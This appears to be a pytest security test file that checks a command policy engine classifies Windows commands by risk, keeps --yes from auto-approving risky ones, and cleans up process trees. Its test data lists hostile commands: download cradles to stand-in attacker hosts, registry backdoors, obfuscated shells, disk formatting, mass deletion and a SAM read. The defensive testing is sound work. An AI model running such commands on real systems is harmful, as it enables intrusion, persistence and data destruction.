"""
Independent Red-Team Security Challenge: Windows Command Policy & Process Management.
Tests nested process cleanup, timeout termination, argument parsing, shell injection, and --yes gate constraints.
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest

from brahmastra.domain.patch.command_policy import CommandPolicyEngine
from brahmastra.domain.patch.models import CommandRiskLevel
from brahmastra.domain.execution.models import TestExecutionConfig
from brahmastra.domain.execution.test_runner import ControlledTestRunner, terminate_process_tree


# ---------------------------------------------------------------------------
# 1. Windows Process Management & Nested Subprocess Cleanup
# ---------------------------------------------------------------------------


def test_windows_nested_subprocess_termination():
    """Verify taskkill /F /T terminates entire process subtree on Windows."""
    mock_proc = MagicMock()
    mock_proc.pid = 12345

    with patch("sys.platform", "win32"), \
         patch("subprocess.run") as mock_run:
        terminate_process_tree(mock_proc)
        mock_run.assert_called_once_with(
            ["taskkill", "/F", "/T", "/PID", "12345"],
            capture_output=True,
            check=False,
        )


def test_windows_timeout_invokes_process_tree_termination():
    """Verify ControlledTestRunner invokes terminate_process_tree on TimeoutExpired on Windows."""
    with patch("sys.platform", "win32"), \
         patch("subprocess.Popen") as mock_popen, \
         patch("brahmastra.domain.execution.test_runner.terminate_process_tree") as mock_term:

        mock_instance = MagicMock()
        import subprocess
        mock_instance.communicate.side_effect = [
            subprocess.TimeoutExpired(cmd=["sleep", "10"], timeout=1.0),
            ("partial stdout", ""),
        ]
        mock_popen.return_value = mock_instance

        config = TestExecutionConfig(
            command=["python", "-c", "import time; time.sleep(10)"],
            working_dir=Path.cwd(),
            timeout_seconds=1.0,
        )
        res = ControlledTestRunner.run(config)
        assert res.timed_out is True
        mock_term.assert_called_once_with(mock_instance)


def test_windows_exception_cleans_up_process():
    """Verify unhandled communication exceptions trigger terminate_process_tree."""
    with patch("sys.platform", "win32"), \
         patch("subprocess.Popen") as mock_popen, \
         patch("brahmastra.domain.execution.test_runner.terminate_process_tree") as mock_term:

        mock_instance = MagicMock()
        mock_instance.communicate.side_effect = RuntimeError("Broken pipe")
        mock_popen.return_value = mock_instance

        config = TestExecutionConfig(
            command=["python", "test.py"],
            working_dir=Path.cwd(),
            timeout_seconds=5.0,
        )
        res = ControlledTestRunner.run(config)
        assert res.passed is False
        mock_term.assert_called_once_with(mock_instance)


# ---------------------------------------------------------------------------
# 2. Windows Command Injection & Argument Manipulation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "injection_payload",
    [
        "dir & net user hacker P@ssword /add",
        "dir && calc.exe",
        "dir | powershell -Command Get-Process",
        "type file.txt > evil.txt",
        "echo 123 >> secret.txt",
        "dir %COMSPEC%",
        "dir %SYSTEMROOT%",
        "dir ^&^& calc",
        "c^m^d /c whoami",
        "p^o^w^e^r^s^h^e^l^l -enc AAAA",
        "cmd.exe /c \"dir & whoami\"",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Write-Host Hack\"",
        "certutil -urlcache -f http://malicious.site/script.bat script.bat",
        "bitsadmin.exe /transfer myjob http://attacker.com/payload.exe C:\\payload.exe",
        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d evil.exe",
        "format D: /fs:NTFS /y",
        "del /f /s /q C:\\*.log",
        "rmdir /s /q C:\\Users\\Default",
    ],
)
def test_windows_injection_and_destructive_payloads_blocked(injection_payload):
    """Verify that compound commands, variable expansions, and download cradles are never SAFE_READ."""
    action = CommandPolicyEngine.evaluate(injection_payload, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ
    assert (
        action.risk_level == CommandRiskLevel.DANGEROUS
        or action.risk_level == CommandRiskLevel.MODERATE
    )


# ---------------------------------------------------------------------------
# 3. Windows --yes Auto-Approval Boundary
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "moderate_or_dangerous_cmd",
    [
        "del file.txt",
        "rmdir /s /q build",
        "certutil -urlcache http://evil.com/x x",
        "powershell -c Get-Service",
        "type C:\\Windows\\System32\\config\\SAM",
        "dir & whoami",
        "echo %SECRET_KEY%",
    ],
)
def test_windows_yes_flag_cannot_auto_approve_moderate_or_dangerous(moderate_or_dangerous_cmd):
    """
    Verify CLI --yes approval rule:
    Only CommandRiskLevel.SAFE_READ can be automatically approved by --yes.
    All MODERATE and DANGEROUS commands MUST require explicit user confirmation.
    """
    action = CommandPolicyEngine.evaluate(moderate_or_dangerous_cmd, working_dir=Path.cwd())
    assert action.risk_level != CommandRiskLevel.SAFE_READ

    # Verify logic matching patch CLI:
    # is_auto_approve = yes_flag and (action.risk_level == CommandRiskLevel.SAFE_READ)
    can_auto_approve = (action.risk_level == CommandRiskLevel.SAFE_READ)
    assert can_auto_approve is False


# ---------------------------------------------------------------------------
# 4. Native Windows Live Verification (Gated on sys.platform == "win32")
# ---------------------------------------------------------------------------


@pytest.mark.skipif(sys.platform != "win32", reason="Requires native Windows host")
def test_live_windows_taskkill_process_tree_termination(tmp_path):
    """
    Live Windows host test verifying that taskkill /F /T kills a spawned process tree
    and that ControlledTestRunner correctly handles timeout without orphaned processes.
    """
    config = TestExecutionConfig(
        command=[sys.executable, "-c", "import time; time.sleep(30)"],
        working_dir=tmp_path,
        timeout_seconds=0.5,
    )
    result = ControlledTestRunner.run(config)
    assert result.timed_out is True
    assert result.passed is False
    assert result.duration_seconds < 5.0


@pytest.mark.skipif(sys.platform != "win32", reason="Requires native Windows host")
def test_live_windows_cred_manager_full_lifecycle():
    """
    Live Windows host test verifying native Credential Manager store, retrieve,
    overwrite, and delete using Advapi32 bindings.
    """
    from brahmastra.infrastructure.vault.windows_cred import WindowsCredentialVault

    vault = WindowsCredentialVault(use_native=True)
    if not vault.use_native:
        pytest.fail("WindowsCredentialVault failed to initialize native Advapi32 bindings on Windows")

    test_svc = "brahmastra_win_sec_test"
    test_user = "sec_test_user"
    test_secret = "WinCred-Live-P@ssw0rd!#99"

    try:
        # Pre-cleanup
        vault.delete_secret(test_svc, test_user)

        # Store
        ref = vault.store_secret(test_svc, test_user, test_secret)
        assert test_svc in ref
        assert vault.has_secret(test_svc, test_user) is True

        # Retrieve
        retrieved = vault.get_secret(test_svc, test_user)
        assert retrieved == test_secret

        # Overwrite
        updated_secret = "WinCred-Updated-Token!$100"
        vault.store_secret(test_svc, test_user, updated_secret)
        assert vault.get_secret(test_svc, test_user) == updated_secret

        # Delete
        deleted = vault.delete_secret(test_svc, test_user)
        assert deleted is True
        assert vault.has_secret(test_svc, test_user) is False
        assert vault.get_secret(test_svc, test_user) is None
    finally:
        vault.delete_secret(test_svc, test_user)

